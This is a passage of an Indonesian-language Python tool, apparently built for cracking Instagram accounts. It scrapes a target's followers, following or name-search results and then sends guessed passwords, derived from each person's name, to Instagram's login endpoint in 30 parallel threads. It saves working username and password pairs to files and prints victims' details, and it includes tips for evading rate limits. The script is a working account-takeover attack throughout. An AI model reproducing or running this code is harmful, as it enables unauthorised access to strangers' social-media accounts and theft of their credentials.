            _2 = respon.cookies.get_dict()
            if "userId" in str(data):
                for xxx in _2:
                    with open("ig.txt", "a") as simpan:
                        simpan.write(xxx+"="+_2[xxx]+";")
                masuk = open("ig.txt","r").read()
                cookie = {"ig.txt": masuk}
                jalan("\n %s[%s*%s] \x1b[1;91mselamat cookies kamu valid"%(N,O,N));time.sleep(2)
                exit(" [%s!%s] \x1b[1;93mjalankan ulang perintah nya dengan ketik python shack.py"%(M,N))
            elif "checkpoint_url" in str(data):
                print('\n %s[%s!%s] \x1b[1;91mopshh seperti akun anda terkena checkpoint:('%(N,M,N));masuk_ig()
            elif "Please wait" in str(data):
                print('\n %s[%s!%s] \x1b[1;93mhidupkan mode pesawat 5 detik'%(N,M,N));masuk_ig()
            else:
                exit('\n %s\x1b[1;91m username/password salah'%(N,M,N));masuk_ig()
    except KeyboardInterrupt:
        print('\n [!]\x1b[1;91m Masukan username atau password yang benar');masuk_ig()
def menu_igeh():
    print('\n \x1b[1;93m[%s\x1b[1;96m01%so\x1b[1;93m] \x1b[1;97mCrack \x1b[1;93mFollowers Publik'%(O,N));time.sleep(0.03)
    print(' \x1b[1;93m[%s\x1b[1;96m02%s\x1b[1;93m] \x1b[1;97mCrack \x1b[1;93mPencarian Nama'%(O,N));time.sleep(0.03)
    print(' \x1b[1;93m[%s\x1b[1;96m03%s\x1b[1;93m] \x1b[1;97mChack \x1b[1;93mHasil Crack'%(O,N));time.sleep(0.03)
    print(' \x1b[1;93m[%s\x1b[1;91m00%s\x1b[1;93m] \x1b[1;91mKembali ke menu awal'%(M,N));time.sleep(0.03)
    pepek = input('\n [%s+%s] input : '%(H,N))
    if pepek in['']:
        print('\n %s[%s×%s] \x1b[1;91mjangan kosong kentod!'%(N,M,N));time.sleep(2);menu_igeh()
    elif pepek in['1','01']:
        pw = ""
        status = ""
        username = input('\n [%s•%s] \x1b[1;97mUsername target : '%(O,N))
        ingfo(username, pw, status)
        print('\n%s \x1b[1;93m[%s\x1b[1;96m01%s\x1b[1;93m] \x1b[1;93mPengikut : %s%s'%(N,O,N,H,str(pengikut)))
        print('%s \x1b[1;93m[%s\x1b[1;96m02%s\x1b[1;93m] \x1b[1;93mMengikuti: %s%s'%(N,O,N,H,str(mengikuti)))
        kuntul = input('\n %s[%s+%s] input : '%(N,H,N))
        limit = input(' %s[%s+%s] limit : '%(N,H,N))
        if kuntul in['']:
            print('\n %s[%s×%s]\x1b[1;91m jangan kosong kentod!'%(N,M,N));time.sleep(2);menu_igeh()
        elif kuntul in['1','01']:
            __followers__(cookie, idg, limit, kuntul)
            proses()
            peweh()
        elif kuntul in['2','02']:
            __followers__(cookie, idg, limit, kuntul)
            proses()
            peweh()
        else:
            print('\n %s[%s×%s] menu [%s%s%s] \x1b[1;91mtidak ada, cek menu nya bro!'%(N,M,N,M,kuntul,N));time.sleep(2);menu_igeh()
    elif pepek in['2','02']:
        jalan('\n %s[%s+%s]\x1b[1;97m Masukan nama yang mau anda cari. contoh : %sMark%s'%(N,O,N,H,N))
        user = input('\n [%s•%s] \x1b[1;97mMasukan nama : '%(O,N))
        jumlah = int(input(' %s[%s+%s] limit : '%(N,H,N)))
        ask = user.replace(" ", "")
        cr.append("asw_lu")
        yan.append(ask+"|"+ask)
        yan.append(ask+"_"+"|"+ask)
        for x in range(1, jumlah+1):
            yan.append(ask+str(x)+"|"+ask)
            yan.append(ask+"_"+str(x)+"|"+ask)
            yan.append(ask+str(x)+"_"+"|"+ask)
        proses()
        peweh()
    elif pepek in['3','03']:
        dirs = os.listdir("results")
        print('\n \x1b[1;97m[ hasil crack yang tersimpan di file anda ]\n')
        for file in dirs:
            print(" [%s+%s] %s"%(O,N,file))
        file = input("\n [%s?%s] \x1b[1;93mmasukan nama file :%s "%(M,N,H))
        if file == "":
            file = input("\n %s[%s?%s] \x1b[1;93mmasukan nama file :%s %s"%(N,M,N,H,N))
        total = open("results/%s"%(file)).read().splitlines()
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
        nm_file = ("%s"%(file)).replace("-", " ")
        hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
        jalan(" [%s*%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
            print("%s%s"%(titid,N));time.sleep(0.03)
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
        input('\n  [ %sKEMBALI%s ] '%(O,N));menu_igeh()
    elif pepek in['0','00']:
        moch_yayan()
    else:
        print('\n %s[%s×%s] menu [%s%s%s] \x1b[1;93mtidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N));time.sleep(2);menu_igeh()
def __followers__(cookie, id_target, limit, kuntul):
    global looping
    if kuntul in[""]:
        print('\n %s[%s×%s] \x1b[1;91mjangan kosong kentod!'%(N,M,N));time.sleep(2);menu_igeh()
    elif kuntul in["1","01"]:
        url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count={}".format(id_target, limit)
    elif kuntul in["2","02"]:
        url = "https://i.instagram.com/api/v1/friendships/{}/following/?count={}".format(id_target, limit)
    else:
        print('\n %s[%s×%s] \x1b[1;97mmenu [%s%s%s] \x1b[1;97mtidak ada, cek menu nya bro!'%(N,M,N,M,kuntul,N));time.sleep(2);menu_igeh()
    with requests.Session() as ses:
        otw = ses.get(url, cookies=cookie, headers=headerz_api)
        for xxx in json.loads(otw.content)["users"]:
            username = xxx["username"]
            nama = xxx["full_name"].encode("utf-8")
            if len(status_foll) != 1:
                sys.stdout.write('\r [\x1b[1;92m*\x1b[0m] \x1b[1;97msedang mengumpulkan %s id... '%(len(yan))); sys.stdout.flush()
                yan.append(username+"|"+nama.decode("utf-8"))
                #open('Tes-dump.txt','a').write(f'{username}|{nama.decode("utf-8")}\n')
                looping+=1
            else:
                poll.append(username)
def peweh():
    with YayanGanteng(max_workers=30) as (__yayanXD__):
        for yntkts in yan:
            try:
                uid, name = yntkts.split('|')
                xz = name.split(' ')
                if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                    pwx = [name, xz[0]+"123", xz[0]+"12345"]
                else:
                    pwx = [name, xz[0]+"123", xz[0]+"12345"]
                __yayanXD__.submit(crack2, uid, pwx)
            except: pass
    exit(f"\n {N}[{H}#{N}] \x1b[1;93mCrack selesai...")
def crack2(user, pwx):
    global looping, loping
    asww = len(pwx)
    for pas in pwx:
        if looping != 1:
            pass
        else:
            if len(status_foll) != 1:
                sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,str(loping),len(yan),len(ok),len(cp))),
                sys.stdout.flush()
                asww -= 1
            else:
                pass
        try:
            if user in ok or user in cp:
                break
            pw = pas.lower()
            try:
                headerz = {"User-Agent": user_agentz_api}
                with requests.Session() as ses:
                    urll = "https://www.instagram.com/"
                    data = ses.get(urll, headers=headerz).content
                    tokett = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
                header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": tokett,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,
                         }
                param = {"username": user,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pw),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
                        }
            except:
                header = {}
                param = {}
                pass
            with requests.Session() as ses:
                url = "https://www.instagram.com/accounts/login/ajax/"
                respon = ses.post(url, data=param, headers=header)
                data = json.loads(respon.content);time.sleep(00.1)
                if "checkpoint_url" in str(data):
                    cepeh = "Checkpoint"
                    ingfo(user, pw, cepeh)
                    open('results/IG-CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" [×] "+user+"|"+pw+"\n")
                    cp.append(user)
                    break
                elif "userId" in str(data):
                    okeh = "Berhasil"
                    if len(status_foll) != 1:
                        ingfo(user, pw, okeh)
                        with open('results/IG-OK-%s-%s-%s.txt' % (ha, op, ta), 'a') as simpan:
                            simpan.write(" [✓] "+user+"|"+pw+"\n")
                        ok.append(user)
                    break
                elif "Please wait" in str(data):
                    sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik         '%(N,M,N)),
                    looping+=1
                    sys.stdout.flush()
                    pwx = [pw]
                    crack2(user, pwx)
                    loping -= 1
                else:
                    looping = 1
                    pass
        except requests.exceptions.ConnectionError:
            sys.stdout.write('\r %s[%s!%s] Tidak ada koneksi internet        '%(N,M,N)),
            sys.stdout.flush()
            looping+=1
            pwx = [pw]
            crack2(user, pwx)
            loping -= 1
        except:
            looping = 1
            pass
    loping+=1
def ingfo(user, pw, status):
    try:
        global idg, pengikut, mengikuti
        dta = requests.get("https://www.instagram.com/%s/?__a=1"%(user), headers={"User-Agent": user_agentz})
        dta_ = dta.json()["graphql"]["user"]
        nama = dta_["full_name"]
        idg = dta_["id"]
        pengikut = dta_["edge_followed_by"]["count"]
        mengikuti = dta_["edge_follow"]["count"]
        if status == "Berhasil":
            print(f"\r {N}[{H}#{N}] name      : {H}{nama}                 \n {N}[{H}#{N}] username  : {H}{user}                 \n {N}[{H}#{N}] password  : {H}{pw}                 \n {N}[{H}#{N}] followers : {H}{str(pengikut)}                 \n {N}[{H}#{N}] following : {H}{str(mengikuti)}                 \n")
        elif status == "Checkpoint":
            print(f"\n {N}[{K}#{N}] name      : {K}{nama}                 \n {N}[{K}#{N}] username  : {K}{user}                 \n {N}[{K}#{N}] password  : {K}{pw}                 \n {N}[{K}#{N}] followers : {K}{str(pengikut)}                 \n {N}[{K}#{N}] following : {K}{str(mengikuti)}                 \n")
        else:
            pass
    except: pass
loping= 1
if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()
# Mau Ngapain Cuk?
